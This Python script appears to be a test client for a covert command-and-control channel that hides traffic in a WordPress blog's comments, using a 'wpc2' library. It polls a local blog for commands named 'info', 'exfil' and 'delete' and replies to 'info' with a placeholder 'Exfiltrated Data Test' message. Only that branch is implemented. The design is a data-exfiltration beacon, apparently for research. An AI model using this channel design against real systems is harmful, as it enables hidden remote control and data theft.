#!/usr/bin/env python3

from wpc2 import *
import datetime
import random
import sys

client_id = sys.argv[1]
random.seed(int(datetime.datetime.now().timestamp()) + int(client_id))

commands = [ "info", "exfil", "delete" ]

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

recv_config = ReceiveConfig()
recv_config.recvr_id = client_id
recv_config.recv_time_slot = 10
recv_config.process_time_slot = 20
recv_config.prev_unapproved_index = 0

btm_send_config= SendConfig()
btm_send_config.sender_id = client_id
btm_send_config.send_time_slot = 30
btm_send_config.confirm_time_slot = 50

loop_counter = 99
recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
while(loop_counter > 0):
    print("[INFO] Client: Waiting to receive data...")
    received_data = receive_data(channel, 1, recv_config)
    recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    command_to_execute = None
    for command in received_data:
        command_to_execute = command.split(":")[1].strip().lower()

    if command_to_execute == "info":
        print("[INFO] Client: Got info command. Sending data...")
        message = Message()
        message.message_id = generate_random_string(10)
        message.message = message.message_id + ": Exfiltrated Data Test"
        send_data(channel, message, btm_send_config)

    loop_counter -= 1
